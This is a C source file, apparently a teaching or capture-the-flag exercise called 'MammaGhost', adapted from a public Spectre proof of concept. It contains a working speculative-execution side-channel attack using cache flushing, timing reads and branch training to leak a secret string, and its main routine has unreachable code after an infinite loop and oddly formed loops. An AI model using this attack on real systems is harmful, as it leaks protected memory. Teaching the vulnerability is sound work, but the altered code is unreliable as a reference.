#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/* code from: https://github.com/chaitanyarahalkar/Spectre-PoC */

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char * secret = "The Magic Words are Sqeamish Ossifraggee";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t x, size_t y) {
  if (((x  + y < array1_size) & ~y)) {
    temp &= array2[array1[x + y] * 512];
  }
}

#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

#define MAX_LINES 480 
#define MAX_LINE_LENGTH 100 

void read_numbers_from_file(const char *filename, size_t x[], int num_lines) {
    FILE *file = fopen(filename, "r");
    if (file == NULL) {
        printf("Failed to open file: %s\n", filename);
        exit(1);
    }

    char line[MAX_LINE_LENGTH];
    size_t num;
    int line_counter = 0;

    while (fgets(line, MAX_LINE_LENGTH, file) != NULL) {
        line_counter++;

        if (sscanf(line, "%lu", &num) == 1) {
            printf("%lu\n", num);
            x[line_counter - 1] = num; 
        } else {
            printf("Failed to parse line number %d: %s", line_counter, line);
        }
    }

    fclose(file); 
}


/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t inputs[12], uint8_t value[2], int score[2]) {
  static int results[256];
  int tries, i, j, k, mix_i, junk = 0;
  size_t training_x, malicious_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;
  int cpui[4];

  malicious_x = inputs[0];
  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = 999; tries > 0; tries--) {

    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */

    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
    for (j = 0; j < 12; j+=2) {
        x = inputs[j % 6];
      _mm_clflush( & array1_size);
      for (volatile int z = 0; z < 500; z++) {} /* Delay (can also mfence) */

      victim_function(inputs[j], inputs[j+1]);

    }


    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = & array2[mix_i * 512];
      // use mfence to serialize rdtsc instead of using rdtscp which doesn't work on cpus 
      _mm_mfence();
    //   time1 = __rdtscp( & junk); /* READ TIMER */
      time1 = __rdtsc(); /* READ TIMER */
      junk = * addr; /* MEMORY ACCESS TO TIME */
    //   time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      _mm_mfence();
      time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
        results[mix_i]++; /* cache hit - add +1 to score for this value */
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}

int main(int argc,
  const char * * argv) {
  size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
  int i, score[2], len = 40;
  uint8_t value[2];
  size_t x[MAX_LINES];
  size_t this_too[12];
  size_t input_var;

  for(size_t idx = 0; idx < MAX_LINES; idx++){
    x[idx] = 0;
  }
  printf("Welcome to MammaGhost\n");
  printf("In these series of assignments, you will be exploring the Spectre Vulnerability\n");
  printf("Please give the name of a file containing 480 lines. Lines will be passed, two at a time, to the vulnerable function. \n");
  printf("But first, here is your christmas present: %p\n%p\n", (void *)secret, (char * ) array1);
    char filename[100];
    scanf("%s", filename);

   
   read_numbers_from_file(filename, x, MAX_LINES);


  while(1);
  for (i = 0; i < sizeof(array2); i++)
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
  i = 0;
  while(len--){
  size_t outr_idx = 40 - len - 1;
  printf("Reading %d bytes:\n", len);
    for (int inner_idx = outr_idx*12; i < outr_idx + 12; i++) {
        this_too[inner_idx - outr_idx] = x[i];
    }
    readMemoryByte(this_too, value, score);
    printf("0x%02X=’%c’", value[0], value[0]);
    printf("\n");
    i += 2;
  }
  return (0);
}
